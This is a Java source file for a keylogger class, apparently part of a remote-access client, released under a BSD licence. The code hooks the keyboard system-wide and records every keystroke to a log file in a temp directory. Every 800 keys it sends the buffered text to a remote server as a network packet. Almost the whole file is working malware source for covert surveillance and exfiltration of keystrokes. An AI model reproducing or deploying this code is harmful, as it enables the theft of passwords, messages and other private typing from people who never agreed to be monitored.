/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.ctx.client.keylogger;

import com.protocol.packets.impl.KeyloggerPacket;
import com.ctx.client.ChannelHandler;
import com.ctx.client.Constants;
import com.ctx.client.utils.DateTimeUtils;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener, Runnable 
{
    private final File logsDir = new File(Constants.tempDir, "logs"); // The directory where we store logs
    private final Path logFile = Paths.get(logsDir + Constants.seperator + DateTimeUtils.getCurrentDateString() + ".txt"); // The logFile where text typed is stored
    private final int sizeToSent = 800; // Size of chars at wich to transfer logs to server        

    private static final Logger logger = Logger.getLogger("logger"); // The keylogger

    @Override
    public void run() 
    {
        logger.info("keyLogger has been started...");

        if (!logsDir.exists()) 
        {
            logsDir.mkdir(); // Create logsDir
            logger.log(Level.INFO, "created Directory {0}", logsDir.getAbsolutePath());
        }

        initLogger(); // Initialize logger

        try 
        {
            GlobalScreen.registerNativeHook(); // Register NativeHook
        } 
        catch (NativeHookException e) 
        {
            logger.warning(e.getMessage());
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new Keylogger()); // Add NativekeyListener
    }

    /**
     * Initialize logger
     */
    private static void initLogger() 
    {
        // Get the logger for "org.jnativehook" and set the level to warning.
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName()); // Initialize logger
        logger.setLevel(Level.WARNING); // Set logger level to warning
        logger.setUseParentHandlers(false); // Don't forget to disable the parent handlers.
    }

    /**
     * NativeKeyPressed
     *
     * @param e
     * @see Override
     * @see textList
     * @see Connection.java
     */
    List<String> textList = new ArrayList<>();

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) 
    {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        if (keyText.length() > 1) 
        {
            textList.add("[" + keyText + "]");
        } 
        else 
        {
            textList.add(keyText);
        }
        
        if (textList.size() >= sizeToSent) 
        {
            StringBuilder sb = new StringBuilder(); 
            for (String s : textList)
            {
                sb.append(s);
                sb.append("\t");
            }
            
            KeyloggerPacket keyloggerPacket = new KeyloggerPacket();
            keyloggerPacket.setLogRec(sb.toString());
            ChannelHandler.writePacket(keyloggerPacket);
            textList.clear();
        }

        try (OutputStream os = Files.newOutputStream(logFile, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) 
        {
            if (keyText.length() > 1) 
            {
                writer.print("[" + keyText + "]");
            } 
            else 
            {
                writer.print(keyText);
            }

        } 
        catch (IOException ex) 
        {
            logger.warning(ex.getMessage());
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) 
    {
        // Do not use @Override
    }

    public void nativeKeyTyped(NativeKeyEvent e) 
    {
        // Do not use @Override
    }
}
